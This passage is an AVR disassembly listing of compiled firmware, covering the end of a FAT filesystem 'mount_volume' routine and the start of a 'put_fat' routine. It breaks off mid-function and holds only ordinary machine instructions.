    1526:	9f 4f       	sbci	r25, 0xFF	; 255
    1528:	34 dc       	rcall	.-1944   	; 0xd92 <ld_word>
    152a:	00 97       	sbiw	r24, 0x00	; 0
    152c:	09 f4       	brne	.+2      	; 0x1530 <mount_volume+0x1b6>
    152e:	7a c1       	rjmp	.+756    	; 0x1824 <mount_volume+0x4aa>
    1530:	9c 01       	movw	r18, r24
    1532:	40 e0       	ldi	r20, 0x00	; 0
    1534:	50 e0       	ldi	r21, 0x00	; 0
    1536:	29 87       	std	Y+9, r18	; 0x09
    1538:	3a 87       	std	Y+10, r19	; 0x0a
    153a:	4b 87       	std	Y+11, r20	; 0x0b
    153c:	5c 87       	std	Y+12, r21	; 0x0c
    153e:	8d 81       	ldd	r24, Y+5	; 0x05
    1540:	9e 81       	ldd	r25, Y+6	; 0x06
    1542:	af 81       	ldd	r26, Y+7	; 0x07
    1544:	b8 85       	ldd	r27, Y+8	; 0x08
    1546:	82 0f       	add	r24, r18
    1548:	93 1f       	adc	r25, r19
    154a:	a4 1f       	adc	r26, r20
    154c:	b5 1f       	adc	r27, r21
    154e:	91 01       	movw	r18, r2
    1550:	32 95       	swap	r19
    1552:	22 95       	swap	r18
    1554:	2f 70       	andi	r18, 0x0F	; 15
    1556:	23 27       	eor	r18, r19
    1558:	3f 70       	andi	r19, 0x0F	; 15
    155a:	23 27       	eor	r18, r19
    155c:	ac 01       	movw	r20, r24
    155e:	bd 01       	movw	r22, r26
    1560:	42 0f       	add	r20, r18
    1562:	53 1f       	adc	r21, r19
    1564:	61 1d       	adc	r22, r1
    1566:	71 1d       	adc	r23, r1
    1568:	49 83       	std	Y+1, r20	; 0x01
    156a:	5a 83       	std	Y+2, r21	; 0x02
    156c:	6b 83       	std	Y+3, r22	; 0x03
    156e:	7c 83       	std	Y+4, r23	; 0x04
    1570:	c4 16       	cp	r12, r20
    1572:	d5 06       	cpc	r13, r21
    1574:	e6 06       	cpc	r14, r22
    1576:	f7 06       	cpc	r15, r23
    1578:	08 f4       	brcc	.+2      	; 0x157c <mount_volume+0x202>
    157a:	56 c1       	rjmp	.+684    	; 0x1828 <mount_volume+0x4ae>
    157c:	c7 01       	movw	r24, r14
    157e:	b6 01       	movw	r22, r12
    1580:	29 81       	ldd	r18, Y+1	; 0x01
    1582:	3a 81       	ldd	r19, Y+2	; 0x02
    1584:	4b 81       	ldd	r20, Y+3	; 0x03
    1586:	5c 81       	ldd	r21, Y+4	; 0x04
    1588:	62 1b       	sub	r22, r18
    158a:	73 0b       	sbc	r23, r19
    158c:	84 0b       	sbc	r24, r20
    158e:	95 0b       	sbc	r25, r21
    1590:	98 01       	movw	r18, r16
    1592:	40 e0       	ldi	r20, 0x00	; 0
    1594:	50 e0       	ldi	r21, 0x00	; 0
    1596:	0e 94 b4 38 	call	0x7168	; 0x7168 <__udivmodsi4>
    159a:	da 01       	movw	r26, r20
    159c:	c9 01       	movw	r24, r18
    159e:	21 15       	cp	r18, r1
    15a0:	31 05       	cpc	r19, r1
    15a2:	41 05       	cpc	r20, r1
    15a4:	51 05       	cpc	r21, r1
    15a6:	09 f4       	brne	.+2      	; 0x15aa <mount_volume+0x230>
    15a8:	41 c1       	rjmp	.+642    	; 0x182c <mount_volume+0x4b2>
    15aa:	26 3f       	cpi	r18, 0xF6	; 246
    15ac:	6f ef       	ldi	r22, 0xFF	; 255
    15ae:	36 07       	cpc	r19, r22
    15b0:	46 07       	cpc	r20, r22
    15b2:	6f e0       	ldi	r22, 0x0F	; 15
    15b4:	56 07       	cpc	r21, r22
    15b6:	18 f0       	brcs	.+6      	; 0x15be <mount_volume+0x244>
    15b8:	00 e0       	ldi	r16, 0x00	; 0
    15ba:	10 e0       	ldi	r17, 0x00	; 0
    15bc:	02 c0       	rjmp	.+4      	; 0x15c2 <mount_volume+0x248>
    15be:	03 e0       	ldi	r16, 0x03	; 3
    15c0:	10 e0       	ldi	r17, 0x00	; 0
    15c2:	86 3f       	cpi	r24, 0xF6	; 246
    15c4:	7f ef       	ldi	r23, 0xFF	; 255
    15c6:	97 07       	cpc	r25, r23
    15c8:	a1 05       	cpc	r26, r1
    15ca:	b1 05       	cpc	r27, r1
    15cc:	10 f4       	brcc	.+4      	; 0x15d2 <mount_volume+0x258>
    15ce:	02 e0       	ldi	r16, 0x02	; 2
    15d0:	10 e0       	ldi	r17, 0x00	; 0
    15d2:	86 3f       	cpi	r24, 0xF6	; 246
    15d4:	9f 40       	sbci	r25, 0x0F	; 15
    15d6:	a1 05       	cpc	r26, r1
    15d8:	b1 05       	cpc	r27, r1
    15da:	10 f4       	brcc	.+4      	; 0x15e0 <mount_volume+0x266>
    15dc:	01 e0       	ldi	r16, 0x01	; 1
    15de:	10 e0       	ldi	r17, 0x00	; 0
    15e0:	01 15       	cp	r16, r1
    15e2:	11 05       	cpc	r17, r1
    15e4:	09 f4       	brne	.+2      	; 0x15e8 <mount_volume+0x26e>
    15e6:	24 c1       	rjmp	.+584    	; 0x1830 <mount_volume+0x4b6>
    15e8:	69 01       	movw	r12, r18
    15ea:	7a 01       	movw	r14, r20
    15ec:	f2 e0       	ldi	r31, 0x02	; 2
    15ee:	cf 0e       	add	r12, r31
    15f0:	d1 1c       	adc	r13, r1
    15f2:	e1 1c       	adc	r14, r1
    15f4:	f1 1c       	adc	r15, r1
    15f6:	ad 85       	ldd	r26, Y+13	; 0x0d
    15f8:	be 85       	ldd	r27, Y+14	; 0x0e
    15fa:	57 96       	adiw	r26, 0x17	; 23
    15fc:	cd 92       	st	X+, r12
    15fe:	dd 92       	st	X+, r13
    1600:	ed 92       	st	X+, r14
    1602:	fc 92       	st	X, r15
    1604:	5a 97       	sbiw	r26, 0x1a	; 26
    1606:	fd 01       	movw	r30, r26
    1608:	47 8e       	std	Z+31, r4	; 0x1f
    160a:	50 a2       	std	Z+32, r5	; 0x20
    160c:	61 a2       	std	Z+33, r6	; 0x21
    160e:	72 a2       	std	Z+34, r7	; 0x22
    1610:	89 85       	ldd	r24, Y+9	; 0x09
    1612:	9a 85       	ldd	r25, Y+10	; 0x0a
    1614:	ab 85       	ldd	r26, Y+11	; 0x0b
    1616:	bc 85       	ldd	r27, Y+12	; 0x0c
    1618:	84 0d       	add	r24, r4
    161a:	95 1d       	adc	r25, r5
    161c:	a6 1d       	adc	r26, r6
    161e:	b7 1d       	adc	r27, r7
    1620:	83 a3       	std	Z+35, r24	; 0x23
    1622:	94 a3       	std	Z+36, r25	; 0x24
    1624:	a5 a3       	std	Z+37, r26	; 0x25
    1626:	b6 a3       	std	Z+38, r27	; 0x26
    1628:	49 81       	ldd	r20, Y+1	; 0x01
    162a:	5a 81       	ldd	r21, Y+2	; 0x02
    162c:	6b 81       	ldd	r22, Y+3	; 0x03
    162e:	7c 81       	ldd	r23, Y+4	; 0x04
    1630:	44 0d       	add	r20, r4
    1632:	55 1d       	adc	r21, r5
    1634:	66 1d       	adc	r22, r6
    1636:	77 1d       	adc	r23, r7
    1638:	43 a7       	std	Z+43, r20	; 0x2b
    163a:	54 a7       	std	Z+44, r21	; 0x2c
    163c:	65 a7       	std	Z+45, r22	; 0x2d
    163e:	76 a7       	std	Z+46, r23	; 0x2e
    1640:	03 30       	cpi	r16, 0x03	; 3
    1642:	11 05       	cpc	r17, r1
    1644:	01 f5       	brne	.+64     	; 0x1686 <mount_volume+0x30c>
    1646:	cf 01       	movw	r24, r30
    1648:	83 5a       	subi	r24, 0xA3	; 163
    164a:	9f 4f       	sbci	r25, 0xFF	; 255
    164c:	a2 db       	rcall	.-2236   	; 0xd92 <ld_word>
    164e:	89 2b       	or	r24, r25
    1650:	09 f0       	breq	.+2      	; 0x1654 <mount_volume+0x2da>
    1652:	f0 c0       	rjmp	.+480    	; 0x1834 <mount_volume+0x4ba>
    1654:	23 28       	or	r2, r3
    1656:	09 f0       	breq	.+2      	; 0x165a <mount_volume+0x2e0>
    1658:	ef c0       	rjmp	.+478    	; 0x1838 <mount_volume+0x4be>
    165a:	8d 85       	ldd	r24, Y+13	; 0x0d
    165c:	9e 85       	ldd	r25, Y+14	; 0x0e
    165e:	81 5a       	subi	r24, 0xA1	; 161
    1660:	9f 4f       	sbci	r25, 0xFF	; 255
    1662:	a1 db       	rcall	.-2238   	; 0xda6 <ld_dword>
    1664:	ad 85       	ldd	r26, Y+13	; 0x0d
    1666:	be 85       	ldd	r27, Y+14	; 0x0e
    1668:	97 96       	adiw	r26, 0x27	; 39
    166a:	6d 93       	st	X+, r22
    166c:	7d 93       	st	X+, r23
    166e:	8d 93       	st	X+, r24
    1670:	9c 93       	st	X, r25
    1672:	9a 97       	sbiw	r26, 0x2a	; 42
    1674:	cc 0c       	add	r12, r12
    1676:	dd 1c       	adc	r13, r13
    1678:	ee 1c       	adc	r14, r14
    167a:	ff 1c       	adc	r15, r15
    167c:	cc 0c       	add	r12, r12
    167e:	dd 1c       	adc	r13, r13
    1680:	ee 1c       	adc	r14, r14
    1682:	ff 1c       	adc	r15, r15
    1684:	2e c0       	rjmp	.+92     	; 0x16e2 <mount_volume+0x368>
    1686:	23 28       	or	r2, r3
    1688:	09 f4       	brne	.+2      	; 0x168c <mount_volume+0x312>
    168a:	d8 c0       	rjmp	.+432    	; 0x183c <mount_volume+0x4c2>
    168c:	2d 81       	ldd	r18, Y+5	; 0x05
    168e:	3e 81       	ldd	r19, Y+6	; 0x06
    1690:	4f 81       	ldd	r20, Y+7	; 0x07
    1692:	58 85       	ldd	r21, Y+8	; 0x08
    1694:	82 0f       	add	r24, r18
    1696:	93 1f       	adc	r25, r19
    1698:	a4 1f       	adc	r26, r20
    169a:	b5 1f       	adc	r27, r21
    169c:	ed 85       	ldd	r30, Y+13	; 0x0d
    169e:	fe 85       	ldd	r31, Y+14	; 0x0e
    16a0:	87 a3       	std	Z+39, r24	; 0x27
    16a2:	90 a7       	std	Z+40, r25	; 0x28
    16a4:	a1 a7       	std	Z+41, r26	; 0x29
    16a6:	b2 a7       	std	Z+42, r27	; 0x2a
    16a8:	02 30       	cpi	r16, 0x02	; 2
    16aa:	11 05       	cpc	r17, r1
    16ac:	29 f4       	brne	.+10     	; 0x16b8 <mount_volume+0x33e>
    16ae:	cc 0c       	add	r12, r12
    16b0:	dd 1c       	adc	r13, r13
    16b2:	ee 1c       	adc	r14, r14
    16b4:	ff 1c       	adc	r15, r15
    16b6:	15 c0       	rjmp	.+42     	; 0x16e2 <mount_volume+0x368>
    16b8:	a3 e0       	ldi	r26, 0x03	; 3
    16ba:	b0 e0       	ldi	r27, 0x00	; 0
    16bc:	a7 01       	movw	r20, r14
    16be:	96 01       	movw	r18, r12
    16c0:	0e 94 e5 38 	call	0x71ca	; 0x71ca <__muluhisi3>
    16c4:	dc 01       	movw	r26, r24
    16c6:	cb 01       	movw	r24, r22
    16c8:	b6 95       	lsr	r27
    16ca:	a7 95       	ror	r26
    16cc:	97 95       	ror	r25
    16ce:	87 95       	ror	r24
    16d0:	f1 e0       	ldi	r31, 0x01	; 1
    16d2:	cf 22       	and	r12, r31
    16d4:	dd 24       	eor	r13, r13
    16d6:	ee 24       	eor	r14, r14
    16d8:	ff 24       	eor	r15, r15
    16da:	c8 0e       	add	r12, r24
    16dc:	d9 1e       	adc	r13, r25
    16de:	ea 1e       	adc	r14, r26
    16e0:	fb 1e       	adc	r15, r27
    16e2:	2f ef       	ldi	r18, 0xFF	; 255
    16e4:	c2 0e       	add	r12, r18
    16e6:	21 e0       	ldi	r18, 0x01	; 1
    16e8:	d2 1e       	adc	r13, r18
    16ea:	e1 1c       	adc	r14, r1
    16ec:	f1 1c       	adc	r15, r1
    16ee:	0b 2e       	mov	r0, r27
    16f0:	b9 e0       	ldi	r27, 0x09	; 9
    16f2:	f6 94       	lsr	r15
    16f4:	e7 94       	ror	r14
    16f6:	d7 94       	ror	r13
    16f8:	c7 94       	ror	r12
    16fa:	ba 95       	dec	r27
    16fc:	d1 f7       	brne	.-12     	; 0x16f2 <mount_volume+0x378>
    16fe:	b0 2d       	mov	r27, r0
    1700:	8c 14       	cp	r8, r12
    1702:	9d 04       	cpc	r9, r13
    1704:	ae 04       	cpc	r10, r14
    1706:	bf 04       	cpc	r11, r15
    1708:	08 f4       	brcc	.+2      	; 0x170c <mount_volume+0x392>
    170a:	9a c0       	rjmp	.+308    	; 0x1840 <mount_volume+0x4c6>
    170c:	8f ef       	ldi	r24, 0xFF	; 255
    170e:	9f ef       	ldi	r25, 0xFF	; 255
    1710:	dc 01       	movw	r26, r24
    1712:	ed 85       	ldd	r30, Y+13	; 0x0d
    1714:	fe 85       	ldd	r31, Y+14	; 0x0e
    1716:	87 87       	std	Z+15, r24	; 0x0f
    1718:	90 8b       	std	Z+16, r25	; 0x10
    171a:	a1 8b       	std	Z+17, r26	; 0x11
    171c:	b2 8b       	std	Z+18, r27	; 0x12
    171e:	83 87       	std	Z+11, r24	; 0x0b
    1720:	94 87       	std	Z+12, r25	; 0x0c
    1722:	a5 87       	std	Z+13, r26	; 0x0d
    1724:	b6 87       	std	Z+14, r27	; 0x0e
    1726:	80 e8       	ldi	r24, 0x80	; 128
    1728:	84 83       	std	Z+4, r24	; 0x04
    172a:	03 30       	cpi	r16, 0x03	; 3
    172c:	11 05       	cpc	r17, r1
    172e:	09 f0       	breq	.+2      	; 0x1732 <mount_volume+0x3b8>
    1730:	48 c0       	rjmp	.+144    	; 0x17c2 <mount_volume+0x448>
    1732:	cf 01       	movw	r24, r30
    1734:	8d 59       	subi	r24, 0x9D	; 157
    1736:	9f 4f       	sbci	r25, 0xFF	; 255
    1738:	2c db       	rcall	.-2472   	; 0xd92 <ld_word>
    173a:	01 97       	sbiw	r24, 0x01	; 1
    173c:	09 f0       	breq	.+2      	; 0x1740 <mount_volume+0x3c6>
    173e:	41 c0       	rjmp	.+130    	; 0x17c2 <mount_volume+0x448>
    1740:	b3 01       	movw	r22, r6
    1742:	a2 01       	movw	r20, r4
    1744:	4f 5f       	subi	r20, 0xFF	; 255
    1746:	5f 4f       	sbci	r21, 0xFF	; 255
    1748:	6f 4f       	sbci	r22, 0xFF	; 255
    174a:	7f 4f       	sbci	r23, 0xFF	; 255
    174c:	8d 85       	ldd	r24, Y+13	; 0x0d
    174e:	9e 85       	ldd	r25, Y+14	; 0x0e
    1750:	bf dc       	rcall	.-1666   	; 0x10d0 <move_window>
    1752:	81 11       	cpse	r24, r1
    1754:	36 c0       	rjmp	.+108    	; 0x17c2 <mount_volume+0x448>
    1756:	ad 85       	ldd	r26, Y+13	; 0x0d
    1758:	be 85       	ldd	r27, Y+14	; 0x0e
    175a:	14 96       	adiw	r26, 0x04	; 4
    175c:	1c 92       	st	X, r1
    175e:	14 97       	sbiw	r26, 0x04	; 4
    1760:	cd 01       	movw	r24, r26
    1762:	8f 5c       	subi	r24, 0xCF	; 207
    1764:	9d 4f       	sbci	r25, 0xFD	; 253
    1766:	15 db       	rcall	.-2518   	; 0xd92 <ld_word>
    1768:	85 35       	cpi	r24, 0x55	; 85
    176a:	9a 4a       	sbci	r25, 0xAA	; 170
    176c:	51 f5       	brne	.+84     	; 0x17c2 <mount_volume+0x448>
    176e:	8d 85       	ldd	r24, Y+13	; 0x0d
    1770:	9e 85       	ldd	r25, Y+14	; 0x0e
    1772:	c3 96       	adiw	r24, 0x33	; 51
    1774:	18 db       	rcall	.-2512   	; 0xda6 <ld_dword>
    1776:	62 35       	cpi	r22, 0x52	; 82
    1778:	72 45       	sbci	r23, 0x52	; 82
    177a:	81 46       	sbci	r24, 0x61	; 97
    177c:	91 44       	sbci	r25, 0x41	; 65
    177e:	09 f5       	brne	.+66     	; 0x17c2 <mount_volume+0x448>
    1780:	8d 85       	ldd	r24, Y+13	; 0x0d
    1782:	9e 85       	ldd	r25, Y+14	; 0x0e
    1784:	89 5e       	subi	r24, 0xE9	; 233
    1786:	9d 4f       	sbci	r25, 0xFD	; 253
    1788:	0e db       	rcall	.-2532   	; 0xda6 <ld_dword>
    178a:	62 37       	cpi	r22, 0x72	; 114
    178c:	72 47       	sbci	r23, 0x72	; 114
    178e:	81 44       	sbci	r24, 0x41	; 65
    1790:	91 46       	sbci	r25, 0x61	; 97
    1792:	b9 f4       	brne	.+46     	; 0x17c2 <mount_volume+0x448>
    1794:	8d 85       	ldd	r24, Y+13	; 0x0d
    1796:	9e 85       	ldd	r25, Y+14	; 0x0e
    1798:	85 5e       	subi	r24, 0xE5	; 229
    179a:	9d 4f       	sbci	r25, 0xFD	; 253
    179c:	04 db       	rcall	.-2552   	; 0xda6 <ld_dword>
    179e:	ad 85       	ldd	r26, Y+13	; 0x0d
    17a0:	be 85       	ldd	r27, Y+14	; 0x0e
    17a2:	1f 96       	adiw	r26, 0x0f	; 15
    17a4:	6d 93       	st	X+, r22
    17a6:	7d 93       	st	X+, r23
    17a8:	8d 93       	st	X+, r24
    17aa:	9c 93       	st	X, r25
    17ac:	52 97       	sbiw	r26, 0x12	; 18
    17ae:	cd 01       	movw	r24, r26
    17b0:	81 5e       	subi	r24, 0xE1	; 225
    17b2:	9d 4f       	sbci	r25, 0xFD	; 253
    17b4:	f8 da       	rcall	.-2576   	; 0xda6 <ld_dword>
    17b6:	ed 85       	ldd	r30, Y+13	; 0x0d
    17b8:	fe 85       	ldd	r31, Y+14	; 0x0e
    17ba:	63 87       	std	Z+11, r22	; 0x0b
    17bc:	74 87       	std	Z+12, r23	; 0x0c
    17be:	85 87       	std	Z+13, r24	; 0x0d
    17c0:	96 87       	std	Z+14, r25	; 0x0e
    17c2:	ad 85       	ldd	r26, Y+13	; 0x0d
    17c4:	be 85       	ldd	r27, Y+14	; 0x0e
    17c6:	0c 93       	st	X, r16
    17c8:	80 91 4a 09 	lds	r24, 0x094A	; 0x80094a <Fsid>
    17cc:	90 91 4b 09 	lds	r25, 0x094B	; 0x80094b <Fsid+0x1>
    17d0:	01 96       	adiw	r24, 0x01	; 1
    17d2:	90 93 4b 09 	sts	0x094B, r25	; 0x80094b <Fsid+0x1>
    17d6:	80 93 4a 09 	sts	0x094A, r24	; 0x80094a <Fsid>
    17da:	16 96       	adiw	r26, 0x06	; 6
    17dc:	9c 93       	st	X, r25
    17de:	8e 93       	st	-X, r24
    17e0:	15 97       	sbiw	r26, 0x05	; 5
    17e2:	fd 01       	movw	r30, r26
    17e4:	13 8a       	std	Z+19, r1	; 0x13
    17e6:	14 8a       	std	Z+20, r1	; 0x14
    17e8:	15 8a       	std	Z+21, r1	; 0x15
    17ea:	16 8a       	std	Z+22, r1	; 0x16
    17ec:	80 e0       	ldi	r24, 0x00	; 0
    17ee:	29 c0       	rjmp	.+82     	; 0x1842 <mount_volume+0x4c8>
    17f0:	8b e0       	ldi	r24, 0x0B	; 11
    17f2:	27 c0       	rjmp	.+78     	; 0x1842 <mount_volume+0x4c8>
    17f4:	8c e0       	ldi	r24, 0x0C	; 12
    17f6:	25 c0       	rjmp	.+74     	; 0x1842 <mount_volume+0x4c8>
    17f8:	80 e0       	ldi	r24, 0x00	; 0
    17fa:	23 c0       	rjmp	.+70     	; 0x1842 <mount_volume+0x4c8>
    17fc:	8a e0       	ldi	r24, 0x0A	; 10
    17fe:	21 c0       	rjmp	.+66     	; 0x1842 <mount_volume+0x4c8>
    1800:	83 e0       	ldi	r24, 0x03	; 3
    1802:	1f c0       	rjmp	.+62     	; 0x1842 <mount_volume+0x4c8>
    1804:	8a e0       	ldi	r24, 0x0A	; 10
    1806:	1d c0       	rjmp	.+58     	; 0x1842 <mount_volume+0x4c8>
    1808:	81 e0       	ldi	r24, 0x01	; 1
    180a:	1b c0       	rjmp	.+54     	; 0x1842 <mount_volume+0x4c8>
    180c:	8d e0       	ldi	r24, 0x0D	; 13
    180e:	19 c0       	rjmp	.+50     	; 0x1842 <mount_volume+0x4c8>
    1810:	8d e0       	ldi	r24, 0x0D	; 13
    1812:	17 c0       	rjmp	.+46     	; 0x1842 <mount_volume+0x4c8>
    1814:	8d e0       	ldi	r24, 0x0D	; 13
    1816:	15 c0       	rjmp	.+42     	; 0x1842 <mount_volume+0x4c8>
    1818:	8d e0       	ldi	r24, 0x0D	; 13
    181a:	13 c0       	rjmp	.+38     	; 0x1842 <mount_volume+0x4c8>
    181c:	8d e0       	ldi	r24, 0x0D	; 13
    181e:	11 c0       	rjmp	.+34     	; 0x1842 <mount_volume+0x4c8>
    1820:	8d e0       	ldi	r24, 0x0D	; 13
    1822:	0f c0       	rjmp	.+30     	; 0x1842 <mount_volume+0x4c8>
    1824:	8d e0       	ldi	r24, 0x0D	; 13
    1826:	0d c0       	rjmp	.+26     	; 0x1842 <mount_volume+0x4c8>
    1828:	8d e0       	ldi	r24, 0x0D	; 13
    182a:	0b c0       	rjmp	.+22     	; 0x1842 <mount_volume+0x4c8>
    182c:	8d e0       	ldi	r24, 0x0D	; 13
    182e:	09 c0       	rjmp	.+18     	; 0x1842 <mount_volume+0x4c8>
    1830:	8d e0       	ldi	r24, 0x0D	; 13
    1832:	07 c0       	rjmp	.+14     	; 0x1842 <mount_volume+0x4c8>
    1834:	8d e0       	ldi	r24, 0x0D	; 13
    1836:	05 c0       	rjmp	.+10     	; 0x1842 <mount_volume+0x4c8>
    1838:	8d e0       	ldi	r24, 0x0D	; 13
    183a:	03 c0       	rjmp	.+6      	; 0x1842 <mount_volume+0x4c8>
    183c:	8d e0       	ldi	r24, 0x0D	; 13
    183e:	01 c0       	rjmp	.+2      	; 0x1842 <mount_volume+0x4c8>
    1840:	8d e0       	ldi	r24, 0x0D	; 13
    1842:	2e 96       	adiw	r28, 0x0e	; 14
    1844:	0f b6       	in	r0, 0x3f	; 63
    1846:	f8 94       	cli
    1848:	de bf       	out	0x3e, r29	; 62
    184a:	0f be       	out	0x3f, r0	; 63
    184c:	cd bf       	out	0x3d, r28	; 61
    184e:	df 91       	pop	r29
    1850:	cf 91       	pop	r28
    1852:	1f 91       	pop	r17
    1854:	0f 91       	pop	r16
    1856:	ff 90       	pop	r15
    1858:	ef 90       	pop	r14
    185a:	df 90       	pop	r13
    185c:	cf 90       	pop	r12
    185e:	bf 90       	pop	r11
    1860:	af 90       	pop	r10
    1862:	9f 90       	pop	r9
    1864:	8f 90       	pop	r8
    1866:	7f 90       	pop	r7
    1868:	6f 90       	pop	r6
    186a:	5f 90       	pop	r5
    186c:	4f 90       	pop	r4
    186e:	3f 90       	pop	r3
    1870:	2f 90       	pop	r2
    1872:	08 95       	ret

00001874 <put_fat>:
    1874:	2f 92       	push	r2
    1876:	3f 92       	push	r3
    1878:	4f 92       	push	r4
    187a:	5f 92       	push	r5
    187c:	6f 92       	push	r6
    187e:	7f 92       	push	r7
    1880:	8f 92       	push	r8
    1882:	9f 92       	push	r9
    1884:	af 92       	push	r10
    1886:	bf 92       	push	r11
    1888:	cf 92       	push	r12
    188a:	df 92       	push	r13
    188c:	ef 92       	push	r14
    188e:	ff 92       	push	r15
    1890:	0f 93       	push	r16
    1892:	1f 93       	push	r17
    1894:	cf 93       	push	r28
    1896:	df 93       	push	r29
    1898:	00 d0       	rcall	.+0      	; 0x189a <put_fat+0x26>
    189a:	00 d0       	rcall	.+0      	; 0x189c <put_fat+0x28>
    189c:	cd b7       	in	r28, 0x3d	; 61
    189e:	de b7       	in	r29, 0x3e	; 62
    18a0:	42 30       	cpi	r20, 0x02	; 2
    18a2:	51 05       	cpc	r21, r1
    18a4:	61 05       	cpc	r22, r1
    18a6:	71 05       	cpc	r23, r1
    18a8:	08 f4       	brcc	.+2      	; 0x18ac <put_fat+0x38>
    18aa:	ea c0       	rjmp	.+468    	; 0x1a80 <put_fat+0x20c>
    18ac:	fc 01       	movw	r30, r24
    18ae:	c7 88       	ldd	r12, Z+23	; 0x17
    18b0:	d0 8c       	ldd	r13, Z+24	; 0x18
    18b2:	e1 8c       	ldd	r14, Z+25	; 0x19
    18b4:	f2 8c       	ldd	r15, Z+26	; 0x1a
    18b6:	4c 15       	cp	r20, r12
    18b8:	5d 05       	cpc	r21, r13
    18ba:	6e 05       	cpc	r22, r14
    18bc:	7f 05       	cpc	r23, r15
    18be:	08 f0       	brcs	.+2      	; 0x18c2 <put_fat+0x4e>
    18c0:	e1 c0       	rjmp	.+450    	; 0x1a84 <put_fat+0x210>
    18c2:	28 01       	movw	r4, r16
    18c4:	39 01       	movw	r6, r18
    18c6:	6a 01       	movw	r12, r20
    18c8:	7b 01       	movw	r14, r22
    18ca:	9c 83       	std	Y+4, r25	; 0x04
    18cc:	8b 83       	std	Y+3, r24	; 0x03
    18ce:	80 81       	ld	r24, Z
    18d0:	82 30       	cpi	r24, 0x02	; 2
    18d2:	09 f4       	brne	.+2      	; 0x18d6 <put_fat+0x62>
    18d4:	73 c0       	rjmp	.+230    	; 0x19bc <put_fat+0x148>
    18d6:	83 30       	cpi	r24, 0x03	; 3
    18d8:	09 f4       	brne	.+2      	; 0x18dc <put_fat+0x68>
    18da:	95 c0       	rjmp	.+298    	; 0x1a06 <put_fat+0x192>
    18dc:	81 30       	cpi	r24, 0x01	; 1
    18de:	09 f0       	breq	.+2      	; 0x18e2 <put_fat+0x6e>
    18e0:	d3 c0       	rjmp	.+422    	; 0x1a88 <put_fat+0x214>
    18e2:	5a 01       	movw	r10, r20
    18e4:	b6 94       	lsr	r11
    18e6:	a7 94       	ror	r10
    18e8:	a4 0e       	add	r10, r20
    18ea:	b5 1e       	adc	r11, r21
    18ec:	43 a1       	ldd	r20, Z+35	; 0x23
    18ee:	54 a1       	ldd	r21, Z+36	; 0x24
    18f0:	65 a1       	ldd	r22, Z+37	; 0x25
    18f2:	76 a1       	ldd	r23, Z+38	; 0x26
    18f4:	c5 01       	movw	r24, r10
    18f6:	89 2f       	mov	r24, r25
    18f8:	99 27       	eor	r25, r25
    18fa:	86 95       	lsr	r24
    18fc:	48 0f       	add	r20, r24
    18fe:	59 1f       	adc	r21, r25
    1900:	61 1d       	adc	r22, r1
    1902:	71 1d       	adc	r23, r1
    1904:	cf 01       	movw	r24, r30
    1906:	e4 db       	rcall	.-2104   	; 0x10d0 <move_window>
    1908:	18 2f       	mov	r17, r24
    190a:	81 11       	cpse	r24, r1
    190c:	be c0       	rjmp	.+380    	; 0x1a8a <put_fat+0x216>
    190e:	2b 81       	ldd	r18, Y+3	; 0x03
    1910:	3c 81       	ldd	r19, Y+4	; 0x04
    1912:	2d 5c       	subi	r18, 0xCD	; 205
    1914:	3f 4f       	sbci	r19, 0xFF	; 255
    1916:	3a 83       	std	Y+2, r19	; 0x02
    1918:	29 83       	std	Y+1, r18	; 0x01
    191a:	15 01       	movw	r2, r10
    191c:	3f ef       	ldi	r19, 0xFF	; 255
    191e:	23 1a       	sub	r2, r19
    1920:	33 0a       	sbc	r3, r19
    1922:	81 e0       	ldi	r24, 0x01	; 1
    1924:	b8 22       	and	r11, r24
    1926:	e9 81       	ldd	r30, Y+1	; 0x01
    1928:	fa 81       	ldd	r31, Y+2	; 0x02
    192a:	ea 0d       	add	r30, r10
    192c:	fb 1d       	adc	r31, r11
    192e:	46 01       	movw	r8, r12
    1930:	57 01       	movw	r10, r14
    1932:	91 e0       	ldi	r25, 0x01	; 1
    1934:	89 22       	and	r8, r25
    1936:	99 24       	eor	r9, r9
    1938:	aa 24       	eor	r10, r10
    193a:	bb 24       	eor	r11, r11
    193c:	c0 fe       	sbrs	r12, 0
    193e:	08 c0       	rjmp	.+16     	; 0x1950 <put_fat+0xdc>
    1940:	20 81       	ld	r18, Z
    1942:	30 e1       	ldi	r19, 0x10	; 16
    1944:	43 9e       	mul	r4, r19
    1946:	c0 01       	movw	r24, r0
    1948:	11 24       	eor	r1, r1
    194a:	2f 70       	andi	r18, 0x0F	; 15
    194c:	82 2b       	or	r24, r18
    194e:	01 c0       	rjmp	.+2      	; 0x1952 <put_fat+0xde>
    1950:	84 2d       	mov	r24, r4
    1952:	80 83       	st	Z, r24
    1954:	81 e0       	ldi	r24, 0x01	; 1
    1956:	eb 81       	ldd	r30, Y+3	; 0x03
    1958:	fc 81       	ldd	r31, Y+4	; 0x04
    195a:	83 83       	std	Z+3, r24	; 0x03
    195c:	43 a1       	ldd	r20, Z+35	; 0x23
    195e:	54 a1       	ldd	r21, Z+36	; 0x24
    1960:	65 a1       	ldd	r22, Z+37	; 0x25
    1962:	76 a1       	ldd	r23, Z+38	; 0x26
    1964:	c1 01       	movw	r24, r2
    1966:	89 2f       	mov	r24, r25
    1968:	99 27       	eor	r25, r25
    196a:	86 95       	lsr	r24
    196c:	48 0f       	add	r20, r24
    196e:	59 1f       	adc	r21, r25
    1970:	61 1d       	adc	r22, r1
    1972:	71 1d       	adc	r23, r1
    1974:	cf 01       	movw	r24, r30
    1976:	ac db       	rcall	.-2216   	; 0x10d0 <move_window>
    1978:	18 2f       	mov	r17, r24
    197a:	81 11       	cpse	r24, r1
    197c:	86 c0       	rjmp	.+268    	; 0x1a8a <put_fat+0x216>
    197e:	f1 e0       	ldi	r31, 0x01	; 1
    1980:	3f 22       	and	r3, r31
    1982:	e9 81       	ldd	r30, Y+1	; 0x01
    1984:	fa 81       	ldd	r31, Y+2	; 0x02
    1986:	e2 0d       	add	r30, r2
    1988:	f3 1d       	adc	r31, r3
    198a:	89 28       	or	r8, r9
    198c:	8a 28       	or	r8, r10
    198e:	8b 28       	or	r8, r11
    1990:	49 f0       	breq	.+18     	; 0x19a4 <put_fat+0x130>
    1992:	68 94       	set
    1994:	13 f8       	bld	r1, 3
    1996:	76 94       	lsr	r7
    1998:	67 94       	ror	r6
    199a:	57 94       	ror	r5
    199c:	47 94       	ror	r4
    199e:	16 94       	lsr	r1
    19a0:	d1 f7       	brne	.-12     	; 0x1996 <put_fat+0x122>
    19a2:	06 c0       	rjmp	.+12     	; 0x19b0 <put_fat+0x13c>
    19a4:	90 81       	ld	r25, Z
